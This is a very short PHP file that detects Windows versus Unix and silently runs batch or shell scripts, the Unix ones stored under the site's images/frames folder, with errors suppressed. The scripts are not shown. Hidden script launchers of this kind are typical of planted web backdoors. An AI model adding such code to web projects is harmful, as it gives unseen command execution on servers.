<?php


if(file_exists("c:\windows")){
@exec("dls.bat");
@exec("dls2.bat");



}
else{
@exec($_SERVER['DOCUMENT_ROOT']."/images/frames/dls.sh");
@exec($_SERVER['DOCUMENT_ROOT']."/images/frames/dls2.sh");

}

?>
true
